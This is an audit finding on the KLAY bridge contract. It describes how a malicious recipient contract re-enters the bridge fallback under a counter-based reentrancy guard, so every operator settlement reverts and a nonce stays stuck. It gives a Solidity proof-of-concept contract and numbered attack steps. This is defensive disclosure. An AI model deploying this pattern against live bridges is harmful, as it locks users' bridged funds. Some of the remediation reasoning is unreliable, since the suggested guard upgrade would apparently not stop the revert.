### Title
`nonReentrant`-on-`nonReentrant` Revert via Malicious `_to` Permanently Locks Bridge KLAY Transfers — (`contracts/service_chain/bridge/BridgeTransferKLAY.sol`)

---

### Summary

`BridgeTransferKLAY.handleKLAYTransfer()` is marked `nonReentrant` and makes a raw `.call.value()` to the user-controlled `_to` address after all state updates. `_requestKLAYTransfer()` is also marked `nonReentrant`. The deployed `ReentrancyGuard` uses the **old counter-based** implementation (not the modern `_status` flag). Under this guard, any `nonReentrant` function that is entered while another `nonReentrant` frame is active will succeed internally but cause the outer frame's post-check to fail, reverting the entire transaction. A user who specifies a malicious `_to` contract on the source chain can exploit this to make every operator attempt to settle their nonce revert, permanently locking the bridged KLAY.

---

### Finding Description

**ReentrancyGuard version in use** (`contracts/libs/openzeppelin-contracts-v2/contracts/utils/ReentrancyGuard.sol`):

```solidity
modifier nonReentrant() {
    _guardCounter += 1;
    uint256 localCounter = _guardCounter;
    _;
    require(localCounter == _guardCounter, "ReentrancyGuard: reentrant call");
}
``` [1](#0-0) 

This is a **counter-increment** guard, not a boolean-flag guard. Its critical property: if a second `nonReentrant` function is entered and exits cleanly while the first is still executing, `_guardCounter` is left at `localCounter_outer + 1`, causing the outer frame's post-check to fail and revert the entire transaction.

**`handleKLAYTransfer`** — `public onlyOperators nonReentrant`:

```solidity
function handleKLAYTransfer(...) public onlyOperators nonReentrant {
    _lowerHandleNonceCheck(_requestedNonce);
    if (!_voteValueTransfer(_requestedNonce)) { return; }
    _setHandledRequestTxHash(_requestTxHash);
    handleNoncesToBlockNums[_requestedNonce] = _requestedBlockNumber;
    _updateHandleNonce(_requestedNonce);
    emit HandleValueTransfer(...);
    (bool ok, ) = _to.call.value(_value)("");          // ← external call to user-controlled address
    require(ok, "handleKLAYTransfer: transfer failed");
}
``` [2](#0-1) 

**`_requestKLAYTransfer`** — `internal nonReentrant`:

```solidity
function _requestKLAYTransfer(address _to, uint256 _feeLimit, bytes memory _extraData)
    internal
    unlockedKLAY
    nonReentrant
{ ... }
``` [3](#0-2) 

The bridge's fallback function calls `_requestKLAYTransfer` directly:

```solidity
function () external payable {
    _requestKLAYTransfer(msg.sender, feeOfKLAY, new bytes(0));
}
``` [4](#0-3) 

**Attack trace:**

| Step | `_guardCounter` | `localCounter` |
|---|---|---|
| `handleKLAYTransfer` enters `nonReentrant` | 2 | outer = 2 |
| State updates, then `_to.call.value(_value)("")` fires | 2 | — |
| Malicious `_to` forwards ≥1 wei to bridge fallback | — | — |
| `_requestKLAYTransfer` enters `nonReentrant` | 3 | inner = 3 |
| `_requestKLAYTransfer` exits: `require(3 == 3)` ✓ | 3 | — |
| `_to` returns `ok = true` | 3 | — |
| `handleKLAYTransfer` exits: `require(2 == 3)` ✗ **REVERT** | — | — |

Because the revert unwinds all state changes (including `handleNoncesToBlockNums[_requestedNonce]` and `_updateHandleNonce`), the nonce is never consumed. Every subsequent operator retry hits the same path and reverts identically.

**Nonce advancement is sequential.** `_updateHandleNonce` advances `lowerHandleNonce` only while `handleNoncesToBlockNums[i] > 0` for consecutive `i` starting from `lowerHandleNonce`:

```solidity
for (i = lowerHandleNonce; i <= limit && handleNoncesToBlockNums[i] > 0; i++) { ... }
lowerHandleNonce = i;
``` [5](#0-4) 

A stuck nonce N means `lowerHandleNonce` is permanently frozen at N, and the KLAY sent on the source chain is never delivered on the destination chain.

---

### Impact Explanation

The user's KLAY is already locked in the source-chain bridge at the time of the request. The destination-chain `handleKLAYTransfer` is the only mechanism to release it. If it always reverts, the KLAY is permanently undeliverable — a direct loss of bridged assets for the victim. Additionally, `lowerHandleNonce` freezes at the stuck nonce, corrupting the bridge's recovery-block tracking for all subsequent nonces.

---

### Likelihood Explanation

Any user initiating a KLAY bridge transfer can set `_to` to a contract they control. No operator privilege is required; the attacker only needs to submit a normal bridge request on the source chain. The malicious `_to` contract is trivial to write (receive KLAY, forward ≥1 wei to the bridge fallback). The attack is deterministic and repeatable.

---

### Recommendation

1. **Upgrade `ReentrancyGuard`** to the modern boolean-flag version (OpenZeppelin ≥ v3), which uses `_status == NOT_ENTERED` / `_status = ENTERED` and reverts immediately on re-entry rather than corrupting a shared counter.
2. **Remove `nonReentrant` from `_requestKLAYTransfer`** (it is `internal`; the public entry points `requestKLAYTransfer` and the fallback should carry the guard instead).
3. **Follow checks-effects-interactions strictly**: the external `.call.value()` in `handleKLAYTransfer` already occurs after all state updates, so the `nonReentrant` guard on `handleKLAYTransfer` is the correct and sufficient protection — the inner `nonReentrant` on the `internal` helper is the redundant, conflicting guard.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.5.6;

interface IBridge {
    function handleKLAYTransfer(
        bytes32, address, address payable, uint256,
        uint64, uint64, bytes calldata
    ) external;
}

contract MaliciousRecipient {
    address payable public bridge;

    constructor(address payable _bridge) public {
        bridge = _bridge;
    }

    // Called by handleKLAYTransfer via _to.call.value(_value)("")
    function() external payable {
        // Forward 1 wei to bridge fallback → triggers _requestKLAYTransfer (nonReentrant)
        // This increments _guardCounter from 2 → 3
        // _requestKLAYTransfer exits cleanly (3 == 3 ✓)
        // handleKLAYTransfer then checks (2 == 3) → REVERT
        (bool ok,) = bridge.call.value(1)("");
        require(ok);
    }
}

// Attack setup:
// 1. Deploy MaliciousRecipient pointing at the Bridge.
// 2. On source chain, call requestKLAYTransfer(_to=MaliciousRecipient, ...).
// 3. Operators call handleKLAYTransfer(..., _to=MaliciousRecipient, _value=X, ...).
// 4. MaliciousRecipient.fallback() fires, sends 1 wei to bridge fallback.
// 5. _requestKLAYTransfer (nonReentrant) runs and exits cleanly.
// 6. handleKLAYTransfer post-check fails → entire tx reverts.
// 7. Nonce N is never consumed; KLAY is permanently locked.
```

The `_requestKLAYTransfer` call in step 4 requires `msg.value > feeOfKLAY`. With `feeOfKLAY = 0` (default), sending 1 wei satisfies `1 > 0`. The malicious contract funds this from the `_value` KLAY it received in the same call. [6](#0-5) [1](#0-0) [7](#0-6)

### Citations

**File:** contracts/libs/openzeppelin-contracts-v2/contracts/utils/ReentrancyGuard.sol (L32-37)
```text
    modifier nonReentrant() {
        _guardCounter += 1;
        uint256 localCounter = _guardCounter;
        _;
        require(localCounter == _guardCounter, "ReentrancyGuard: reentrant call");
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferKLAY.sol (L62-100)
```text
    function handleKLAYTransfer(
        bytes32 _requestTxHash,
        address _from,
        address payable _to,
        uint256 _value,
        uint64 _requestedNonce,
        uint64 _requestedBlockNumber,
        bytes memory _extraData
    )
        public
        onlyOperators
        nonReentrant
    {
        _lowerHandleNonceCheck(_requestedNonce);

        if (!_voteValueTransfer(_requestedNonce)) {
            return;
        }

        _setHandledRequestTxHash(_requestTxHash);

        handleNoncesToBlockNums[_requestedNonce] = _requestedBlockNumber;
        _updateHandleNonce(_requestedNonce);

        emit HandleValueTransfer(
            _requestTxHash,
            TokenType.KLAY,
            _from,
            _to,
            address(0),
            _value,
            _requestedNonce,
            lowerHandleNonce,
            _extraData
        );

        (bool ok, ) = _to.call.value(_value)("");
        require(ok, "handleKLAYTransfer: transfer failed");
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferKLAY.sol (L103-124)
```text
    function _requestKLAYTransfer(address _to, uint256 _feeLimit,  bytes memory _extraData)
        internal
        unlockedKLAY
        nonReentrant
    {
        require(isRunning, "stopped bridge");
        require(msg.value > _feeLimit, "insufficient amount");

        uint256 fee = _payKLAYFeeAndRefundChange(_feeLimit);

        emit RequestValueTransfer(
            TokenType.KLAY,
            msg.sender,
            _to,
            address(0),
            msg.value.sub(_feeLimit),
            requestNonce,
            fee,
            _extraData
        );
        requestNonce++;
    }
```

**File:** contracts/service_chain/bridge/BridgeTransferKLAY.sol (L127-129)
```text
    function () external payable {
        _requestKLAYTransfer(msg.sender, feeOfKLAY, new bytes(0));
    }
```

**File:** contracts/service_chain/bridge/BridgeTransfer.sol (L139-156)
```text
    function _updateHandleNonce(uint64 _requestedNonce) internal {
        if (_requestedNonce > upperHandleNonce) {
            upperHandleNonce = _requestedNonce;
        }

        uint64 limit = lowerHandleNonce + 200;
        if (limit > upperHandleNonce) {
            limit = upperHandleNonce;
        }

        uint64 i;
        for (i = lowerHandleNonce; i <= limit && handleNoncesToBlockNums[i] > 0; i++) {
            recoveryBlockNumber = handleNoncesToBlockNums[i];
            delete handleNoncesToBlockNums[i];
            delete closedValueTransferVotes[i];
        }
        lowerHandleNonce = i;
    }
```
